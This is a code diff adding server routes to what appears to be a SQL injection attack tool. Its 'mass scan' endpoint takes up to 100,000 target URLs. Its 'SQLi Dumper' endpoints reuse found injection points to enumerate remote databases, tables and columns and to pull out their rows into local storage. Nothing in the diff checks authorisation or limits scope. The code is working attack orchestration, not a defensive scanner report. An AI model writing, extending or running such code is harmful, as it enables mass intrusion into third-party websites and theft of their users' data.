@@ -838,5 +838,584 @@ export async function registerRoutes(
     }
   });
 
+  // ============================================================
+  // MASS SCANNING - Uses VulnerabilityScanner for each target
+  // ============================================================
+
+  let activeMassScanner: any = null;
+
+  // Start mass scan
+  app.post("/api/mass-scan/start", async (req, res) => {
+    try {
+      const { targets, settings } = req.body;
+      
+      if (!targets || !Array.isArray(targets) || targets.length === 0) {
+        return res.status(400).json({ message: "No targets provided" });
+      }
+
+      if (targets.length > 100000) {
+        return res.status(400).json({ message: "Maximum 100,000 targets allowed" });
+      }
+
+      const { MassScanner } = await import("./scanner/mass-scanner");
+      const concurrency = settings?.concurrency || 50;
+      const scanner = new MassScanner(concurrency);
+      activeMassScanner = scanner;
+
+      const scanTargets = targets.map((url: string, index: number) => ({
+        url: url.trim(),
+        id: index + 1,
+      }));
+
+      // Start scanning in background
+      scanner.scanBatch(scanTargets).then(() => {
+        console.log(`[Mass Scan] Complete`);
+        activeMassScanner = null;
+      });
+
+      res.json({
+        message: "Mass scan started",
+        totalTargets: targets.length,
+        concurrency,
+      });
+    } catch (error: any) {
+      console.error("Mass scan error:", error);
+      res.status(500).json({ message: "Failed to start mass scan" });
+    }
+  });
+
+  // Get mass scan progress
+  app.get("/api/mass-scan/progress", async (req, res) => {
+    try {
+      if (!activeMassScanner) {
+        return res.json({
+          running: false,
+          total: 0,
+          completed: 0,
+          scanning: 0,
+          vulnerable: 0,
+          clean: 0,
+          errors: 0,
+          progress: 0,
+        });
+      }
+
+      const progress = activeMassScanner.getProgress();
+      const percentComplete = progress.total > 0 
+        ? Math.round((progress.completed / progress.total) * 100) 
+        : 0;
+
+      res.json({
+        running: true,
+        ...progress,
+        progress: percentComplete,
+      });
+    } catch (error: any) {
+      res.status(500).json({ message: "Failed to get progress" });
+    }
+  });
+
+  // Get vulnerable targets from mass scan
+  app.get("/api/mass-scan/vulnerable", async (req, res) => {
+    try {
+      if (!activeMassScanner) {
+        // Get recent completed scans with vulnerabilities
+        const scans = await storage.getScans();
+        const recentScans = scans.slice(0, 1000); // Last 1000 scans
+        const vulnerableScans = [];
+
+        for (const scan of recentScans) {
+          if (scan.status === "completed" && scan.summary && scan.summary.confirmed > 0) {
+            const vulns = await storage.getVulnerabilities(scan.id);
+            if (vulns.length > 0) {
+              vulnerableScans.push({
+                scanId: scan.id,
+                url: scan.targetUrl,
+                vulnerability: {
+                  id: vulns[0].id,
+                  parameter: vulns[0].parameter,
+                  payload: vulns[0].payload,
+                  dbType: vulns[0].evidence?.includes("MySQL") ? "MySQL" : 
+                          vulns[0].evidence?.includes("PostgreSQL") ? "PostgreSQL" : "Unknown",
+                  technique: vulns[0].type,
+                },
+              });
+            }
+          }
+        }
+
+        return res.json(vulnerableScans);
+      }
+
+      // Get results from active scanner
+      const vulnerable = activeMassScanner.getVulnerableTargets();
+      const results = [];
+
+      for (const result of vulnerable) {
+        const vulns = await storage.getVulnerabilities(result.scanId);
+        if (vulns.length > 0) {
+          results.push({
+            scanId: result.scanId,
+            url: result.url,
+            vulnerability: {
+              id: vulns[0].id,
+              parameter: vulns[0].parameter,
+              payload: vulns[0].payload,
+              dbType: vulns[0].evidence?.includes("MySQL") ? "MySQL" : 
+                      vulns[0].evidence?.includes("PostgreSQL") ? "PostgreSQL" : "Unknown",
+              technique: vulns[0].type,
+            },
+          });
+        }
+      }
+
+      res.json(results);
+    } catch (error: any) {
+      console.error("Get vulnerable targets error:", error);
+      res.status(500).json({ message: "Failed to get vulnerable targets" });
+    }
+  });
+
+  // ============================================================
+  // DATA DUMPING ENDPOINTS - SQLi Dumper Feature
+  // ============================================================
+
+  // Start database dump for a vulnerability
+  app.post("/api/vulnerabilities/:id/dump/start", async (req, res) => {
+    try {
+      const vulnId = Number(req.params.id);
+      const vuln = await storage.getVulnerability(vulnId);
+      
+      if (!vuln) {
+        return res.status(404).json({ message: "Vulnerability not found" });
+      }
+      
+      if (!vuln.parameter) {
+        return res.status(400).json({ message: "No vulnerable parameter found" });
+      }
+      
+      // Create dumping job
+      const job = await storage.createDumpingJob({
+        vulnerabilityId: vulnId,
+        scanId: vuln.scanId,
+        targetUrl: vuln.url,
+        targetType: "database",
+        targetId: 0,
+        status: "pending",
+        progress: 0,
+      });
+      
+      // Start dumping in background
+      const { DataDumpingEngine } = await import("./scanner/data-dumping-engine");
+      const abortController = new AbortController();
+      
+      const engine = new DataDumpingEngine({
+        targetUrl: vuln.url,
+        vulnerableParameter: vuln.parameter,
+        dbType: detectDbType(vuln.evidence || ""),
+        technique: detectTechnique(vuln.type),
+        injectionPoint: vuln.payload || "1",
+        signal: abortController.signal,
+        onProgress: async (progress, message) => {
+          await storage.updateDumpingJob(job.id, { progress });
+        },
+        onLog: async (level, message) => {
+          console.log(`[Dumping Job ${job.id}] ${level}: ${message}`);
+        },
+      });
+      
+      // Run dump
+      engine.dumpAll().then(async (result) => {
+        if (result.success) {
+          // Save databases
+          for (const db of result.databases) {
+            await storage.createExtractedDatabase({
+              vulnerabilityId: vulnId,
+              scanId: vuln.scanId,
+              targetUrl: vuln.url,
+              databaseName: db.name,
+              dbType: detectDbType(vuln.evidence || ""),
+              extractionMethod: detectTechnique(vuln.type),
+              status: "discovered",
+              metadata: {
+                version: db.version,
+                user: db.user,
+                currentDb: db.currentDb,
+              },
+            });
+          }
+          
+          await storage.updateDumpingJob(job.id, {
+            status: "completed",
+            progress: 100,
+            completedAt: new Date(),
+          });
+        } else {
+          await storage.updateDumpingJob(job.id, {
+            status: "failed",
+            progress: 100,
+            errorMessage: result.error,
+            completedAt: new Date(),
+          });
+        }
+      });
+      
+      res.json({ job, message: "Dumping job started" });
+    } catch (error: any) {
+      console.error("Start dump error:", error);
+      res.status(500).json({ message: "Failed to start dump" });
+    }
+  });
+
+  // Get extracted databases for a vulnerability
+  app.get("/api/vulnerabilities/:id/databases", async (req, res) => {
+    try {
+      const vulnId = Number(req.params.id);
+      const databases = await storage.getExtractedDatabases(vulnId);
+      res.json(databases);
+    } catch (error: any) {
+      console.error("Get databases error:", error);
+      res.status(500).json({ message: "Failed to get databases" });
+    }
+  });
+
+  // Dump tables from a database
+  app.post("/api/databases/:id/dump-tables", async (req, res) => {
+    try {
+      const dbId = Number(req.params.id);
+      const database = await storage.getExtractedDatabase(dbId);
+      
+      if (!database) {
+        return res.status(404).json({ message: "Database not found" });
+      }
+      
+      const vuln = await storage.getVulnerability(database.vulnerabilityId);
+      if (!vuln || !vuln.parameter) {
+        return res.status(400).json({ message: "Invalid vulnerability" });
+      }
+      
+      // Create dumping job
+      const job = await storage.createDumpingJob({
+        vulnerabilityId: database.vulnerabilityId,
+        scanId: database.scanId,
+        targetUrl: database.targetUrl,
+        targetType: "table",
+        targetId: dbId,
+        status: "running",
+        progress: 0,
+      });
+      
+      // Start table enumeration
+      const { DataDumpingEngine } = await import("./scanner/data-dumping-engine");
+      const abortController = new AbortController();
+      
+      const engine = new DataDumpingEngine({
+        targetUrl: database.targetUrl,
+        vulnerableParameter: vuln.parameter,
+        dbType: database.dbType as any,
+        technique: database.extractionMethod as any,
+        injectionPoint: vuln.payload || "1",
+        signal: abortController.signal,
+        onProgress: async (progress, message) => {
+          await storage.updateDumpingJob(job.id, { progress });
+        },
+      });
+      
+      engine.enumerateTables(database.databaseName).then(async (tables) => {
+        // Save tables
+        for (const table of tables) {
+          await storage.createExtractedTable({
+            databaseId: dbId,
+            tableName: table.name,
+            status: "discovered",
+          });
+        }
+        
+        await storage.updateExtractedDatabase(dbId, {
+          tableCount: tables.length,
+          status: "completed",
+        });
+        
+        await storage.updateDumpingJob(job.id, {
+          status: "completed",
+          progress: 100,
+          itemsTotal: tables.length,
+          itemsExtracted: tables.length,
+          completedAt: new Date(),
+        });
+      });
+      
+      res.json({ job, message: "Table dumping started" });
+    } catch (error: any) {
+      console.error("Dump tables error:", error);
+      res.status(500).json({ message: "Failed to dump tables" });
+    }
+  });
+
+  // Get tables for a database
+  app.get("/api/databases/:id/tables", async (req, res) => {
+    try {
+      const dbId = Number(req.params.id);
+      const tables = await storage.getExtractedTables(dbId);
+      res.json(tables);
+    } catch (error: any) {
+      console.error("Get tables error:", error);
+      res.status(500).json({ message: "Failed to get tables" });
+    }
+  });
+
+  // Dump columns from a table
+  app.post("/api/tables/:id/dump-columns", async (req, res) => {
+    try {
+      const tableId = Number(req.params.id);
+      const table = await storage.getExtractedTable(tableId);
+      
+      if (!table) {
+        return res.status(404).json({ message: "Table not found" });
+      }
+      
+      const database = await storage.getExtractedDatabase(table.databaseId);
+      if (!database) {
+        return res.status(404).json({ message: "Database not found" });
+      }
+      
+      const vuln = await storage.getVulnerability(database.vulnerabilityId);
+      if (!vuln || !vuln.parameter) {
+        return res.status(400).json({ message: "Invalid vulnerability" });
+      }
+      
+      // Create dumping job
+      const job = await storage.createDumpingJob({
+        vulnerabilityId: database.vulnerabilityId,
+        scanId: database.scanId,
+        targetUrl: database.targetUrl,
+        targetType: "column",
+        targetId: tableId,
+        status: "running",
+        progress: 0,
+      });
+      
+      // Start column enumeration
+      const { DataDumpingEngine } = await import("./scanner/data-dumping-engine");
+      const abortController = new AbortController();
+      
+      const engine = new DataDumpingEngine({
+        targetUrl: database.targetUrl,
+        vulnerableParameter: vuln.parameter,
+        dbType: database.dbType as any,
+        technique: database.extractionMethod as any,
+        injectionPoint: vuln.payload || "1",
+        signal: abortController.signal,
+        onProgress: async (progress, message) => {
+          await storage.updateDumpingJob(job.id, { progress });
+        },
+      });
+      
+      engine.enumerateColumns(database.databaseName, table.tableName).then(async (columns) => {
+        // Save columns
+        for (const col of columns) {
+          await storage.createExtractedColumn({
+            tableId,
+            columnName: col.name,
+            dataType: col.type,
+            isNullable: col.isNullable,
+            columnKey: col.key,
+            columnDefault: col.default,
+            extra: col.extra,
+          });
+        }
+        
+        await storage.updateExtractedTable(tableId, {
+          columnCount: columns.length,
+          status: "completed",
+        });
+        
+        await storage.updateDumpingJob(job.id, {
+          status: "completed",
+          progress: 100,
+          itemsTotal: columns.length,
+          itemsExtracted: columns.length,
+          completedAt: new Date(),
+        });
+      });
+      
+      res.json({ job, message: "Column dumping started" });
+    } catch (error: any) {
+      console.error("Dump columns error:", error);
+      res.status(500).json({ message: "Failed to dump columns" });
+    }
+  });
+
+  // Get columns for a table
+  app.get("/api/tables/:id/columns", async (req, res) => {
+    try {
+      const tableId = Number(req.params.id);
+      const columns = await storage.getExtractedColumns(tableId);
+      res.json(columns);
+    } catch (error: any) {
+      console.error("Get columns error:", error);
+      res.status(500).json({ message: "Failed to get columns" });
+    }
+  });
+
+  // Dump data from a table
+  app.post("/api/tables/:id/dump-data", async (req, res) => {
+    try {
+      const tableId = Number(req.params.id);
+      const limit = req.body.limit || 100;
+      
+      const table = await storage.getExtractedTable(tableId);
+      if (!table) {
+        return res.status(404).json({ message: "Table not found" });
+      }
+      
+      const database = await storage.getExtractedDatabase(table.databaseId);
+      if (!database) {
+        return res.status(404).json({ message: "Database not found" });
+      }
+      
+      const vuln = await storage.getVulnerability(database.vulnerabilityId);
+      if (!vuln || !vuln.parameter) {
+        return res.status(400).json({ message: "Invalid vulnerability" });
+      }
+      
+      const columns = await storage.getExtractedColumns(tableId);
+      const columnNames = columns.map(c => c.columnName);
+      
+      if (columnNames.length === 0) {
+        return res.status(400).json({ message: "No columns found. Please dump columns first." });
+      }
+      
+      // Create dumping job
+      const job = await storage.createDumpingJob({
+        vulnerabilityId: database.vulnerabilityId,
+        scanId: database.scanId,
+        targetUrl: database.targetUrl,
+        targetType: "table",
+        targetId: tableId,
+        status: "running",
+        progress: 0,
+        itemsTotal: limit,
+      });
+      
+      // Start data extraction
+      const { DataDumpingEngine } = await import("./scanner/data-dumping-engine");
+      const abortController = new AbortController();
+      
+      const engine = new DataDumpingEngine({
+        targetUrl: database.targetUrl,
+        vulnerableParameter: vuln.parameter,
+        dbType: database.dbType as any,
+        technique: database.extractionMethod as any,
+        injectionPoint: vuln.payload || "1",
+        signal: abortController.signal,
+        onProgress: async (progress, message) => {
+          await storage.updateDumpingJob(job.id, { progress });
+        },
+      });
+      
+      engine.extractTableData(database.databaseName, table.tableName, columnNames, limit)
+        .then(async (rows) => {
+          // Save data
+          for (let i = 0; i < rows.length; i++) {
+            await storage.createExtractedData({
+              tableId,
+              rowIndex: i,
+              rowData: rows[i],
+            });
+          }
+          
+          await storage.updateExtractedTable(tableId, {
+            rowCount: rows.length,
+            status: "completed",
+          });
+          
+          await storage.updateDumpingJob(job.id, {
+            status: "completed",
+            progress: 100,
+            itemsExtracted: rows.length,
+            completedAt: new Date(),
+          });
+        });
+      
+      res.json({ job, message: "Data dumping started" });
+    } catch (error: any) {
+      console.error("Dump data error:", error);
+      res.status(500).json({ message: "Failed to dump data" });
+    }
+  });
+
+  // Get data from a table
+  app.get("/api/tables/:id/data", async (req, res) => {
+    try {
+      const tableId = Number(req.params.id);
+      const limit = req.query.limit ? Number(req.query.limit) : 100;
+      const offset = req.query.offset ? Number(req.query.offset) : 0;
+      
+      const data = await storage.getExtractedData(tableId, limit, offset);
+      const totalCount = await storage.getExtractedDataCount(tableId);
+      
+      res.json({ data, total: totalCount, limit, offset });
+    } catch (error: any) {
+      console.error("Get data error:", error);
+      res.status(500).json({ message: "Failed to get data" });
+    }
+  });
+
+  // Get dumping jobs for a vulnerability
+  app.get("/api/vulnerabilities/:id/jobs", async (req, res) => {
+    try {
+      const vulnId = Number(req.params.id);
+      const jobs = await storage.getDumpingJobs(vulnId);
+      res.json(jobs);
+    } catch (error: any) {
+      console.error("Get jobs error:", error);
+      res.status(500).json({ message: "Failed to get jobs" });
+    }
+  });
+
+  // Cancel a dumping job
+  app.post("/api/jobs/:id/cancel", async (req, res) => {
+    try {
+      const jobId = Number(req.params.id);
+      const job = await storage.getDumpingJob(jobId);
+      
+      if (!job) {
+        return res.status(404).json({ message: "Job not found" });
+      }
+      
+      await storage.updateDumpingJob(jobId, {
+        status: "failed",
+        errorMessage: "Cancelled by user",
+        completedAt: new Date(),
+      });
+      
+      res.json({ message: "Job cancelled" });
+    } catch (error: any) {
+      console.error("Cancel job error:", error);
+      res.status(500).json({ message: "Failed to cancel job" });
+    }
+  });
+
   return httpServer;
+}
+
+// Helper functions for dumping
+function detectDbType(evidence: string): "mysql" | "postgresql" | "mssql" | "oracle" | "sqlite" {
+  const e = evidence.toLowerCase();
+  if (e.includes("mysql") || e.includes("mariadb")) return "mysql";
+  if (e.includes("postgresql") || e.includes("postgres")) return "postgresql";
+  if (e.includes("mssql") || e.includes("microsoft sql")) return "mssql";
+  if (e.includes("oracle")) return "oracle";
+  if (e.includes("sqlite")) return "sqlite";
+  return "mysql"; // default
+}
+
+function detectTechnique(vulnType: string): "error-based" | "union-based" | "boolean-based" | "time-based" {
+  const t = vulnType.toLowerCase();
+  if (t.includes("error")) return "error-based";
+  if (t.includes("union")) return "union-based";
+  if (t.includes("boolean")) return "boolean-based";
+  if (t.includes("time")) return "time-based";
+  return "error-based"; // default
 }
